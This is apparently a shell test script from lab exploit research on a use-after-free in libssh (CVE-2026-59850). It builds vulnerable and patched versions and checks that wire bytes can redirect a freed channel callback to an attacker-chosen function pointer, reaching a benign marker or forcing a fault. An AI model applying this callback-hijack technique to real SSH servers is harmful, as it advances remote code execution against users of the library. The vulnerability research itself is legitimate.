#!/bin/sh
# W4 indirect-call experiment for CVE-2026-59850. Starting from the W3
# groom-survive lane, the lab app redirects the freed channel's callback-list
# node to an app-owned fake entry whose channel_data_function pointer is
# chosen by wire bytes. A clean vulnerable run invokes a benign lab marker; a
# deliberately invalid wire pointer faults. This is rung-4 IP mechanics only:
# PR:L authenticated peer, lab-only detach/fake objects, no remote command.
# All traffic stays on 127.0.0.1. ASan quarantine is disabled in this lane only.
set -u
cd "$(dirname "$0")" || exit 1

V=libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d
F=libssh-mirror-7dfabb1fd213196c4912c314b418ff36c882ea54

for kind in vuln fixed; do
    src=$V; b=build-asan
    [ "$kind" = fixed ] && { src=$F; b=build-fixed; }
    clang -std=gnu99 -O1 -g -fsanitize=address -fno-omit-frame-pointer \
        -I "$b/src" -I "$src/src" -I "$src/include" -I "$b/include" -I "$b" \
        real_wire.c "$b/src/libssh.a" -lcrypto -lpthread -ldl \
        -o "real_wire-$kind" || exit 1
done

if [ ! -f hostkey ]; then
    ssh-keygen -q -t ed25519 -N '' -f hostkey </dev/null >/dev/null 2>&1 || exit 1
fi

PASS=0; FAIL=0
check() {
    if [ "$2" = yes ]; then
        PASS=$((PASS+1)); echo "PASS-$1"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1"
    fi
}

ASAN_OPTIONS=detect_leaks=0,quarantine_size_mb=0 timeout 20 \
    ./real_wire-vuln ./hostkey groom-call \
    >evidence-wire-vuln-groom-call.out 2>&1
s=evidence-wire-vuln-groom-call.out
check call-wire-pointer "$(grep -q 'CLIENT sent call fn=0x' "$s" &&
    grep -q 'SERVER call fake_cbs=0x' "$s" && echo yes)"
check call-marker "$(grep -q 'SERVER MARKER called len=' "$s" && echo yes)"
check call-counter-write "$(grep -q 'SERVER target_after=0x41414141414141c1' "$s" && echo yes)"
check call-no-asan "$([ "$(grep -c 'ERROR: AddressSanitizer' "$s")" -eq 0 ] && echo yes)"
check call-clean-exit "$(grep -q 'CLIENT rc=0 SERVER status=0x0' "$s" && echo yes)"

ASAN_OPTIONS=detect_leaks=0,quarantine_size_mb=0 timeout 20 \
    ./real_wire-vuln ./hostkey groom-call-bad \
    >evidence-wire-vuln-groom-call-bad.out 2>&1
b=evidence-wire-vuln-groom-call-bad.out
check bad-wire-pointer "$(grep -q 'CLIENT sent call fn=0x4141414141414141' "$b" && echo yes)"
check bad-no-marker "$([ "$(grep -c 'SERVER MARKER called' "$b")" -eq 0 ] && echo yes)"
check bad-fault "$([ "$(grep -c 'ERROR: AddressSanitizer' "$b")" -gt 0 ] && echo yes)"

ASAN_OPTIONS=detect_leaks=0,quarantine_size_mb=0 timeout 20 \
    ./real_wire-fixed ./hostkey groom-call \
    >evidence-wire-fixed-groom-call.out 2>&1
f=evidence-wire-fixed-groom-call.out
check fixed-call-suppressed "$([ "$(grep -c 'SERVER data #2' "$f")" -eq 0 ] &&
    [ "$(grep -c 'SERVER MARKER called' "$f")" -eq 0 ] &&
    [ "$(grep -c 'ERROR: AddressSanitizer' "$f")" -eq 0 ] &&
    grep -q 'SERVER target_after=0x4141414141414141' "$f" && echo yes)"

echo "RESULT $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
